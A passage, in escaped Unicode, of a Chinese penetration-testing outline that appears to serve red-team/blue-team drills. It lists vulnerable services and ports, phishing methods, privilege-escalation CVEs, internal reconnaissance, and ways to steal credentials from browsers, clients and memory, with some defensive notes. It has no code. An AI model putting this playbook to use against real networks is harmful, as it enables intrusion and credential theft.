\u63d0\u6743, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] SMB [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 445\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] WMI [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 135\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] WinRM [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5985\u7aef\u53e3,\u6b64\u9879\u4e3b\u8981\u9488\u5bf9\u67d0\u4e9b\u9ad8\u7248\u672cWindows, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] RDP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3389\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u522b\u4eba\u7559\u7684shift\u7c7b\u540e\u95e8 ] SSH [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 22\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] ORACLE [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1521\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] Mysql [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3306\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743(\u53ea\u9002\u7528\u4e8e\u90e8\u5206\u8001\u7cfb\u7edf) ] REDIS [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 6379\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u672a\u6388\u6743\u8bbf\u95ee, \u5199\u6587\u4ef6(webshell,\u542f\u52a8\u9879,\u8ba1\u5212\u4efb\u52a1), \u63d0\u6743 ] POSTGRESQL[ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5432\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] LDAP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 389\u7aef\u53e3, \u672a\u6388\u6743\u8bbf\u95ee, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732 ] SMTP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 25\u7aef\u53e3, \u670d\u52a1\u9519\u8bef\u914d\u7f6e\u5bfc\u81f4\u7684\u7528\u6237\u540d\u679a\u4e3e\u6f0f\u6d1e, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] POP3 [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 110\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] IMAP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 143\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Exchange [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 443\u7aef\u53e3, \u63a5\u53e3\u5f31\u53e3\u4ee4\u7206\u7834 eg: Owa,ews,oab,AutoDiscover... pth\u8131\u90ae\u4ef6, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ... ] VNC [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5900\u7aef\u53e3, \u5f31\u53e3\u4ee4 ] FTP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 21\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u533f\u540d\u8bbf\u95ee/\u53ef\u5199, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Rsync [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 873\u7aef\u53e3, \u672a\u6388\u6743, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Mongodb [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 27017\u7aef\u53e3, \u672a\u6388\u6743, \u5f31\u53e3\u4ee4 ] TELNET [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 23\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u540e\u95e8\u690d\u5165 ] SVN [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3690\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] JAVA RMI [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1099\u7aef\u53e3, \u53ef\u80fd\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u5229\u7528 ] CouchDB [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5984\u7aef\u53e3, \u672a\u6388\u6743\u8bbf\u95ee ] 0x04 \u5165\u53e3\u6743\u9650\u83b7\u53d6 \u00b6 \u4f20\u7edf\u9493\u9c7c\u653b\u51fb\u5229\u7528\uff0c\u5b9e\u9645\u62a4\u7f51\u573a\u666f\u4e2d\u7528\u7684\u975e\u5e38\u9891\u7e41\uff0c\u7ec6\u8282\u975e\u5e38\u591a\uff0c\u6b64\u5904\u4e0d\u4e00\u4e00\u5217\u4e3e\uff0c\u9632\u5fa1\u91cd\u70b9 \u53d1\u4fe1\u524d\u671f\u51c6\u5907 \u679a\u4e3e\u6709\u6548\u7684\u76ee\u6807\u90ae\u7bb1\u7528\u6237\u540d\u5217\u8868 \u6279\u91cf\u63a2\u6d4b\u76ee\u6807\u90ae\u7bb1\u5f31\u53e3\u4ee4 \u4f2a\u9020\u53d1\u4fe1\u4eba [ \u53d1\u4fe1\u90ae\u670d\u642d\u5efa ] \u9493\u9c7c\u4fe1 [ \u9488\u5bf9\u4e0d\u540c\u884c\u4e1a\u4e00\u822c\u4e5f\u90fd\u4f1a\u4e8b\u5148\u51c6\u5907\u597d\u5404\u79cd\u5404\u6837\u7684\u9488\u5bf9\u6027\u7684\u53d1\u4fe1\u8bdd\u672f\u6a21\u677f,\u4ee5\u6b64\u6765\u63d0\u5230\u5b9e\u9645\u53d1\u4fe1\u6210\u529f\u7387 ] ...... \u5178\u578b\u6295\u9012\u65b9\u5f0f \u7b2c\u4e00\u79cd,\u76f4\u63a5\u7ed9\u76ee\u6807\u53d1\u9001\u5404\u79cd\u5e38\u89c4\u6728\u9a6c\u4fe1 \u4f20\u7edf\u5b8f\u5229\u7528 \u6346\u7ed1 exe[zip,7z] lnk chm \u81ea\u89e3\u538b \u6728\u9a6c\u94fe\u63a5 OLE CVE-2017-11882 [ \u5229\u7528\u6f0f\u6d1e\u89e6\u53d1 ] ... \u7b2c\u4e8c\u79cd,\u7ed9\u76ee\u6807\u53d1\u9001\u5404\u79cd\u9493\u9c7c\u94fe\u63a5,\u6bd4\u5982, \u5229\u7528\u5404\u79cd\u76ee\u6807\u767b\u5f55\u53e3\u7684\u9493\u9c7c\u9875\u9762\u6765\u7a83\u53d6\u5404\u79cd\u5185\u7f51\u8d26\u53f7\u5bc6\u7801 Vpn Mail OA Net ntlm hash [ \u8fdc\u7a0b\u6a21\u677f\u6ce8\u5165,pdf...\u9493hash,\u56fd\u5185ISP\u8fc7\u6ee4SMB\u6d41\u91cf\u4e0d\u9002\u7528 ] ...... 0x05 \u4e3b\u673a\u5b89\u5168 [ \u63d0\u6743\u5229\u7528\uff0c\u9632\u5fa1\u91cd\u70b9 ] \u00b6 \u4ee5\u4e0b\u53ea\u5355\u72ec\u6311\u4e86\u4e00\u4e9b\u5728 \u901a\u7528\u6027, \u7a33\u5b9a\u6027, \u6613\u7528\u6027, \u5b9e\u9645\u6210\u529f\u7387\u90fd\u76f8\u5bf9\u8f83\u597d\u7684\u6d1e\u548c\u65b9\u5f0f,\u5176\u5b83\u7684\u4e00\u4e9b\"\u8fb9\u7f18\u6027\"\u7684\u5229\u7528\u90fd\u6682\u672a\u63d0\u53ca Windows \u7cfb\u7edf\u6f0f\u6d1e \u672c\u5730\u63d0\u6743 [ \u6210\u529f\u7684\u524d\u63d0\u662f,\u4fdd\u8bc1\u4e8b\u5148\u5df2\u505a\u597d\u5404\u79cd\u9488\u5bf9\u6027\u514d\u6740 ] BypassUAC [ win7 / 8 / 8.1 / 10 ] MS14-058[KB3000061] [\u91cd\u70b9] MS14-068[KB3011780] [\u91cd\u70b9] ms15-051[KB3045171] [\u91cd\u70b9] MS15-077[KB3077657] [\u91cd\u70b9] MS16-032[KB3124280] [\u91cd\u70b9] ms16-075 [\u91cd\u70b9] MS16-135[KB3199135] [\u91cd\u70b9] MS17-010[KB4013389] [\u91cd\u70b9] cve-2019-0708 [\u91cd\u70b9] CVE-2019-0803 [\u91cd\u70b9] CVE-2019-1322 & CVE-2019-1405 [\u91cd\u70b9] cve-2019-12750 [ \u8d5b\u95e8\u94c1\u514b(\u7528\u7684\u8f83\u591a)\u672c\u5730\u63d0\u6743 ] [\u91cd\u70b9] linux \u5185\u6838\u6f0f\u6d1e \u672c\u5730\u63d0\u6743 [ linux-exploit-suggester ] CVE-2016-5195 [\u91cd\u70b9] CVE-2017-16995 CVE-2019-13272 \u5229\u7528\u5404\u7c7b\u7b2c\u4e09\u65b9\u670d\u52a1 / \u8f6f\u4ef6\u5de5\u5177\u63d0\u6743 Mssql [\u91cd\u70b9] Oracle [\u91cd\u70b9] Mysql \u5404\u7c7b\u7b2c\u4e09\u65b9\u8f6f\u4ef6dll\u52ab\u6301 [\u91cd\u70b9] suid\u6743\u9650 \u8ba1\u5212\u4efb\u52a1 \u5404\u79cd\u9519\u8bef\u670d\u52a1\u914d\u7f6e\u5229\u7528 0x06 \u5185\u7f51\u5b89\u5168 [ \u654f\u611f\u4fe1\u606f\u641c\u96c6\uff0c\u9632\u5fa1\u91cd\u70b9\uff0c\u53ef\u5728\u6b64\u9879\u4e25\u683c\u9650\u5236\u5404\u79cd\u7cfb\u7edf\u5185\u7f6e\u547d\u4ee4\u6267\u884c ] \u00b6 \u641c\u96c6\u5f53\u524d\u5df2\u63a7\"\u8df3\u677f\u673a\"\u7684\u5404\u7c7b\u654f\u611f\u4fe1\u606f \u6ce8: \u5982\u4e0b\u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u540e\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684,\u6b64\u5904\u4e0d\u518d\u8d58\u8ff0 \u67e5\u770b\u5f53\u524dshell\u6743\u9650 \u53ca \u8be6\u7ec6\u7cfb\u7edf\u5185\u6838\u7248\u672c \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684 \u8be6\u7ec6ip\u914d\u7f6e,\u5305\u62ec \u6240\u5728\u57df, ip, \u63a9\u7801, \u7f51\u5173, \u4e3b\u5907 dns ip \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6700\u8fd1\u7684\u7528\u6237\u767b\u5f55\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u6240\u6709\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55 [ \u4e3b\u8981\u9488\u5bf9linux,\u91cc\u9762\u53ef\u80fd\u5305\u542b\u7684\u6709\u5404\u7c7b\u654f\u611f\u8d26\u53f7\u5bc6\u7801,ip,\u654f\u611f\u670d\u52a1\u914d\u7f6e... ] \u83b7\u53d6\u672c\u673a\u6240\u6709 \u670d\u52a1/\u8fdb\u7a0b [\u5305\u62ec\u5404\u4e2a\u8fdb\u7a0b\u7684\u8be6\u7ec6\u6743\u9650,\u4e5f\u5305\u62ec\u76ee\u6807\u7cfb\u7edf\u4e2d\u7684\u53ef\u7591\u6076\u610f\u8fdb\u7a0b(\u6709\u53ef\u80fd\u662f\u540c\u884c\u7684\u9a6c)]/\u7aef\u53e3/\u7f51\u7edc\u8fde\u63a5\u4fe1\u606f \u83b7\u53d6\u672c\u673a\u6240\u7528\u6740\u8f6f / \u76d1\u63a7\u79cd\u7c7b [ \u540e\u7eed\u597d\u9488\u5bf9\u6027\u7684\u505a\u514d\u6740 ] \u83b7\u53d6\u672c\u673a rdp / ssh \u7aef\u53e3\u5f00\u542f\u72b6\u6001 \u53ca \u5176\u9ed8\u8ba4\u7aef\u53e3\u53f7 \u83b7\u53d6\u672c\u673a\u6240\u6709\u7528\u6237\u7684rdp\u5916\u8fde\u8bb0\u5f55 \u83b7\u53d6\u672c\u673a\u7684\u6240\u6709SSH\u767b\u5f55\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u767b\u5f55\u6210\u529f\u7684\u65e5\u5fd7 [ \u9488\u5bf9windows ] \u83b7\u53d6\u672c\u673a\u6240\u6709\u5df2\u5b89\u88c5\u8f6f\u4ef6\u7684\u8be6\u7ec6\u5217\u8868 [ \u4e3b\u8981\u4e3a\u6293\u5bc6\u7801,\u63d0\u6743,\u7559\u540e\u95e8\u505a\u51c6\u5907 ] \u83b7\u53d6\u672c\u673a\u5404\u4e2a\u6d4f\u89c8\u5668\u4e2d\u4fdd\u5b58\u7684 \u6240\u6709\u4e66\u7b7e\u9875 \u53ca \u5386\u53f2\u6d4f\u89c8\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7528\u6237\u521b\u5efa\u7684\u6240\u6709\u8ba1\u5212\u4efb\u52a1\u5217\u8868 \u53ca \u8ba1\u5212\u4efb\u52a1\u6240\u5bf9\u5e94\u7684\u6267\u884c\u811a\u672c\u5185\u5bb9 [ \u6709\u4e9b\u6267\u884c\u811a\u672c\u4e2d\u5f88\u53ef\u80fd\u5b58\u7684\u6709\u5404\u79cd\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 ] \u83b7\u53d6\u5f53\u524d\u7528\u6237 \u684c\u9762 \u53ca \u56de\u6536\u7ad9 \u91cc\u7684\u6240\u6709\u6587\u4ef6\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709\u5b58\u5728suid\u6743\u9650\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4ee3\u7406 [ ip & \u7aef\u53e3 ] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u7684\u81ea\u542f\u52a8\u6ce8\u518c\u8868\u9879\u503c \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709 ipc \u8fde\u63a5 \u53ca \u5df2\u542f\u7528\u5171\u4eab \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709\u6302\u8f7d[mount] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u9632\u706b\u5899\u72b6\u6001 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u5206\u533a/\u76d8\u7b26\u53ca\u5176\u8be6\u7ec6\u4f7f\u7528\u60c5\u51b5 \u83b7\u53d6\u672c\u673a\u7684\u7d2f\u8ba1\u5f00\u673a\u65f6\u957f \u83b7\u53d6\u672c\u673aarp / dns\u7f13\u5b58 \u83b7\u53d6\u5f53\u524d\u673a\u5668\u73af\u5883\u53d8\u91cf [ \u4e3b\u8981\u60f3\u770b\u770b\u76ee\u6807\u673a\u5668\u4e0a\u6709\u65e0python,jdk,ruby...\u7b49\u8bed\u8a00\u7684\u6267\u884c\u73af\u5883,\u540e\u671f\u53ef\u8bbe\u6cd5\u5229\u7528 ] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u672c\u5730\u7528\u6237\u53ca\u7ec4\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edfhost\u6587\u4ef6\u5185\u5bb9 \u83b7\u53d6\u5f53\u524d\u673a\u5668\u786c\u4ef6\u8bbe\u5907\u4fe1\u606f[ \u4e3b\u8981\u4e3a\u5224\u65ad\u5f53\u524d\u673a\u5668\u662f\u5426\u4e3a\u865a\u62df\u673a ] \u8fdc\u7a0b\u622a\u5c4f\u6355\u6349\u76ee\u6807\u7528\u6237\u654f\u611f\u64cd\u4f5c \u7531\u4e8e\u4e0a\u8ff0\u5927\u90e8\u5206\u7684\u641c\u96c6\u52a8\u4f5c\u90fd\u662f\u57fa\u4e8e\u7cfb\u7edf\u5185\u7f6e\u5de5\u5177\u548c\u63a5\u53e3,\u6545,\u53ef\u5b8c\u5168\u4f9d\u9760EDR\u6765\u5b9e\u65f6\u6355\u6349\u5404\u7c7b\u654f\u611f\u8fdb\u7a0b\u4e0a\u62a5\u6076\u610f\u64cd\u4f5c \u5229\u7528\u5f53\u524d\u5df2\u63a7 \"\u8df3\u677f\u673a\", \u5206\u6790\u76ee\u6807\u5185\u7f51\u5927\u81f4\u7f51\u7edc\u62d3\u6251\u53ca\u6240\u6709\u5173\u952e\u6027\u4e1a\u52a1\u673a\u5668\u5206\u5e03 \u6279\u91cf\u6293\u53d6\u5185\u7f51\u6240\u6709windows\u673a\u5668\u540d \u548c \u6240\u5728 \"\u57df\" / \"\u5de5\u4f5c\u7ec4\u540d\" [smb\u63a2\u6d4b\u626b\u63cf] \u9488\u5bf9\u5185\u7f51\u7684\u5404\u79cd\u9ad8\u5371\u654f\u611f\u670d\u52a1\u5b9a\u4f4d[\"\u5b89\u5168\" \u7aef\u53e3\u626b\u63cf (\u5728\u907f\u514d\u5bf9\u65b9\u9632\u62a4\u62a5\u8b66\u62e6\u622a\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u5404\u79cd\u5e38\u89c4\u670d\u52a1\u63a2\u6d4b\u8bc6\u522b)] \u5185\u7f51\u6279\u91cf Web Banner \u6293\u53d6,\u83b7\u53d6\u5173\u952e\u76ee\u6807\u4e1a\u52a1\u7cfb\u7edf\u5982\u4e0b \u5185\u7f51\u5404\u79cd\u6587\u4ef6[\u5171\u4eab]\u670d\u52a1\u5668 \u5185\u7f51\u5404\u7c7bweb\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51\u5404\u7c7b\u6570\u636e\u5e93\u670d\u52a1\u5668 \u5185\u7f51\u90ae\u4ef6\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51Vpn\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51\u5404\u7c7b\u5e38\u89c4\u8d44\u4ea7\u72b6\u6001\u76d1\u63a7\u670d\u52a1\u5668,eg: zabbix,nagios,cacti... \u5185\u7f51\u5404\u7c7b\u9632\u62a4\u7684\u4e3b\u63a7\u7aef,\u6bd4\u5982,\u9632\u706b\u5899,EDR,\u6001\u52bf\u611f\u77e5 \u4ea7\u54c1\u7684web\u4e3b\u63a7\u7aef... \u5185\u7f51\u65e5\u5fd7\u670d\u52a1\u5668 \u5185\u7f51\u8865\u4e01\u670d\u52a1\u5668 \u5185\u7f51\u5404\u7c7bOA,ERP,CRM,SRM,HR\u7cfb\u7edf... \u5185\u7f51\u6253\u5370\u670d\u52a1\u5668 \u5185\u7f51 MES \u7cfb\u7edf \u5185\u7f51\u865a\u62df\u5316\u670d\u52a1\u5668 / \u8d85\u878d\u5408\u5e73\u53f0 [Vmware ESX] \u5185\u7f51\u5821\u5792\u673a... \u5185\u7f51\u8fd0\u7ef4,\u7814\u53d1 \u90e8\u95e8\u5458\u5de5\u7684\u673a\u5668 \u5185\u7f51\u8def\u7531,\u4ea4\u6362\u8bbe\u5907... \u7b49\u7b49\u7b49 ... \u9488\u5bf9\u4ee5\u4e0a\u7684\u5404\u79cd\u5e38\u89c4\u5185\u7f51\u63a2\u6d4b\u626b\u63cf,\u5176\u5b9e\u5728\u6d41\u91cf\u4e0a\u90fd\u4f1a\u6709\u975e\u5e38\u6e05\u6670\u7684\u8868\u73b0 \u901a\u8fc7\u5728\u4e00\u4e9b\u5173\u952e\u8282\u70b9\u8bbe\u5907/\u670d\u52a1\u5668\u4e0a\u90e8\u7f72\u63a2\u9488\u641c\u96c6\u6d41\u91cf,\u518d\u914d\u5408\u5927\u6570\u636e\u5173\u8054\u5206\u6790\u67e5\u627e\u5404\u79cd\u654f\u611f\u7279\u5f81,\u7406\u8bba\u4e0a\u662f\u76f8\u5bf9\u5bb9\u6613\u53d1\u73b0\u5404\u7c7b\u626b\u63cf\u63a2\u6d4b\u75d5\u8ff9\u7684, \u9488\u5bf9\u5404\u7c7b\u5df2\u77e5\u7cfb\u7edf\u9ad8\u5371RCE\u6f0f\u6d1e\u7684\u6279\u91cf\u63a2\u6d4b\u8bc6\u522b\u4e0e\u5229\u7528 MS08-067 [ \u5176\u5b9e,\u67d0\u4e9b\u7279\u6b8a\u884c\u4e1a\u7684\u7cfb\u7edf\u53ef\u80fd\u975e\u5e38\u8001,\u6781\u5c11\u66f4\u65b0,\u6545,\u8fd8\u662f\u6709\u5b58\u5728\u7684\u53ef\u80fd ] MS17-010 CVE-2019-0708 \u5176\u5b9e\u9488\u5bf9\u6b64\u7c7b\u6f0f\u6d1e\u7684\u653b\u51fb\u5229\u7528\u8bc6\u522b,\u5c31\u663e\u5f97\u6bd4\u8f83\u76f4\u767d\u4e86,\u901a\u8fc7\u6df1\u5165\u5206\u6790\u6bcf\u79cd\u6f0f\u6d1e\u5728\u5b9e\u9645\u653b\u51fb\u5229\u7528\u8fc7\u7a0b\u6240\u4ea7\u751f\u7684\u4e00\u4e9b\u5178\u578b\u6d41\u91cf\u7279\u5f81\u548c\u7cfb\u7edf\u65e5\u5fd7\u5373\u53ef\u5927\u81f4\u5224\u65ad 0x07 \u5185\u7f51\u5b89\u5168 [ \u5404\u7c7b\u654f\u611f\u51ed\u8bc1 \"\u641c\u96c6\" \u4e0e \"\u7a83\u53d6\" ] \u00b6 \u4e3b\u52a8\u5bc6\u7801\u641c\u96c6 \u6ce8:\u5982\u4e0b\u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u6216\u8005\u5728\u6307\u5b9a\u7528\u6237\u6743\u9650\u4e0b\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684 \u6b64\u5904\u4e0d\u518d\u8d58\u8ff0, \u6b64\u9879\u975e\u9632\u5fa1\u91cd\u70b9, \u56e0\u4e3a\u538b\u6839\u4e5f\u4e0d\u597d\u9632 \u6279\u91cf\u6293\u53d6\u5f53\u524d\u673a\u5668\u4e0a\u7684 \"\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u4e2d\u4fdd\u5b58\u7684\u5404\u79cd\u8d26\u53f7\u5bc6\u7801\" \u6bd4\u5982,\u5404\u79cd\u6570\u636e\u5e93\u8fde\u63a5\u914d\u7f6e\u6587\u4ef6,\u5404\u7c7b\u670d\u52a1\u81ea\u8eab\u7684\u914d\u7f6e\u6587\u4ef6(redis,http basic...)... \u60f3\u529e\u6cd5 \"\u63a7\u5236\u76ee\u6807 \u8fd0\u7ef4\u7ba1\u7406 / \u6280\u672f\u4eba\u5458 \u7684\u5355\u673a,\u4ece\u8fd9\u4e9b\u673a\u5668\u4e0a\u53bb\u641c\u96c6\u53ef\u80fd\u4fdd\u5b58\u7740\u5404\u7c7b\u654f\u611f\u7f51\u7edc\u8d44\u4ea7\u7684\u8d26\u53f7\u5bc6\u7801\u8868\" \u6bd4\u5982, .ls,.doc,*.docx, *.txt.... \u6293\u53d6\u5404\u7c7b \"\u6570\u636e\u5e93\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u5404\u79cd\u6570\u636e\u5e93\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 \u6bd4\u5982,Navicat,SSMS[MSSQL\u81ea\u5e26\u5ba2\u6237\u7aef\u7ba1\u7406\u5de5\u5177,\u91cc\u9762\u4e5f\u53ef\u80fd\u4fdd\u5b58\u7684\u6709\u5bc6\u7801(\u52a0\u5bc6\u540e\u7684base64)] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf \"\u6ce8\u518c\u8868\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801hash\" [ Windows ] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709 \"\u672c\u5730\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801/hash\" [ Windows & linux ] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709 \"\u7528\u6237token\" [ Windows ] \u6293\u53d6 \"windows\u51ed\u636e\u7ba1\u7406\u5668\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\" \u6293\u53d6 \"MSTSC \u5ba2\u6237\u7aef\u4e2d\u4fdd\u5b58\u7684\u6240\u6709rdp\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\" \u6293\u53d6\u5404\u7c7b \"VNC\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u8fde\u63a5\u5bc6\u7801\" \u6293\u53d6 \"GPP\u76ee\u5f55\u4e0b\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801\" [ \u5305\u62ec\u7ec4\u7b56\u7565\u76ee\u5f55\u4e2dXML\u91cc\u4fdd\u5b58\u7684\u5bc6\u7801hash \u548c NETLOGON\u76ee\u5f55\u4e0b\u7684\u67d0\u4e9b\u811a\u672c\u4e2d\u4fdd\u5b58\u7684\u8d26\u53f7\u5bc6\u7801 ] \u6293\u53d6\u5404\u7c7b \"SSH\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdlinux\u7cfb\u7edf\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\", SecureCRT,Xshell,WinSCP,putty \u6293\u53d6\u5404\u7c7b \"\u6d4f\u89c8\u5668\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdweb\u767b\u5f55\u5bc6\u7801\",Chrome [360\u6d4f\u89c8\u5668],Firefox,IE,QQ\u6d4f\u89c8\u5668 \u6293\u53d6\u5404\u7c7b \"\u6570\u636e\u5e93\u8868\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801hash\" \u6293\u53d6\u5404\u7c7b \"FTP\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdftp\u767b\u5f55\u8d26\u53f7\u5bc6\u7801\", filezila, xftp... \u6293\u53d6\u5404\u7c7b \"\u90ae\u4ef6\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cd\u90ae\u7bb1\u8d26\u53f7\u5bc6\u7801\", forxmail, thunderbird... \u6293\u53d6\u5404\u7c7b \"SVN\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u6240\u6709\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\u53ca\u9879\u76ee\u5730\u5740\" \u6293\u53d6\u5404\u7c7b \"VPN\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdvpn\u94fe\u63a5\u8d26\u53f7\u5bc6\u7801\" \u88ab\u52a8\u5bc6\u7801\u641c\u96c6 [ \u7b49\u7740\u7ba1\u7406\u5458\u81ea\u5df1\u6765\u9001\u5bc6\u7801 ] [\u6ce8: \u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u540e\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684, \u6b64\u5904\u4e0d\u518d\u8d58\u8ff0 , \u662f\u9632\u5fa1\u91cd\u70b9] Windows SSP [\u6301\u4e45\u5316/\u5185\u5b58] Hook PasswordChangeNotify [\u6301\u4e45\u5316/\u5185\u5b58] OWA \u767b\u5f55\u8d26\u53f7\u5bc6\u7801\u622a\u83b7 \u622a\u83b7mstsc.exe\u4e2d\u8f93\u5165\u7684rdp\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 linux \u522b\u540d\u8bb0\u5f55\u5229\u7528 \u672c\u673a\u660e\u6587\u5bc6\u7801\u55c5\u63a2 [ http,ftp,pop3... ] \u4f20\u7edf\u952e\u76d8\u8bb0\u5f55 windows\u84dd\u5c4f\u6280\u5de7 [ \u6b64\u64cd\u4f5c\u4e3b\u8981\u4e3a\u5e94\u5bf9\u4e0d\u65f6\u4e4b\u9700,\u6bd4\u5982,\u641e\u84dd\u5c4f,\u767b\u7ba1\u7406\u5458\u767b\u5f55\u6293\u5bc6\u7801 ] Hash\u7206\u7834: Hashcat [ \u5b8c\u5168\u62fcGPU ] 0x08 \u5185\u7f51\u5b89\u5168 [ \u5185\u7f51\u5e38\u7528 \"\u96a7\u9053\"\" / \"\u8f6c\u53d1\"\" / \"\u4ee3\u7406\"\" \u7a7f\u900f\u624b\u6cd5 